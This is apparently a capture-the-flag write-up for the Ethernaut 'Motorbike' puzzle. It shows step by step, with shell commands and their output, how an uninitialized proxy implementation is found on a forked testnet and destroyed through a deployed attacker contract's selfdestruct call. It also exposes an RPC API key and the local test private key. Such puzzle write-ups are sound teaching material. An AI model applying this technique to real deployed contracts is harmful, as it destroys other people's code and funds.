The key point of this puzzle is the `engine` contract not been initialized.

After we get level instance, we got instance address:0x1BE977270c1Bdcd00B2dcdF2D760C295D5e7B3b3

Then we can fork goerli testnet

```shell
    anvil -f https://eth-goerli.g.alchemy.com/v2/S21PcG6EE34N4Wf98de9fgi54sO7KN9W
```

Then we can use `cast storage` command to check the `_IMPLEMENTATION_SLOT` slot, and Engine contract is in this address
We got `engine` contract address: 0xe07955bd92f57aef5663c38bf2d721bf756dc3f8

```shell
cast storage --rpc-url http://127.0.0.1:8545 \
0x1BE977270c1Bdcd00B2dcdF2D760C295D5e7B3b3 \
0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc

0x000000000000000000000000e07955bd92f57aef5663c38bf2d721bf756dc3f8
```

Deploy `MotorbikeAttacker` contract on anvil fork testnet.

```shell
forge script --rpc-url http://127.0.0.1:8545 \
--private-key=0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80 \
--sender=0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266 \
--broadcast -vvvv \
./script/Motorbike.s.sol


✅  [Success]Hash: 0x4e52d9c7c301a62b3b7bf3a1d527616aceb36d2a05166ff8872d135eb6fdc4c3
Contract Address: 0x8FDEA91B1d4510C315861E55a335cc3c0BB774cd
Block: 9770332
Paid: 0.000430635001578995 ETH (143545 gas * 3.000000011 gwei)
```

Call `Motorbike`'s `attack` function

```shell
cast send --rpc-url http://127.0.0.1:8545 \
--private-key=0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80 \
0x8FDEA91B1d4510C315861E55a335cc3c0BB774cd \
"attack(address)" 0xe07955bd92f57aef5663c38bf2d721bf756dc3f8
```

At last, we can double check the `engine` contract has been `selfdestruct`ed

```shell
cast codesize \
--rpc-url http://127.0.0.1:8545 \
0xe07955bd92f57aef5663c38bf2d721bf756dc3f8

0
```
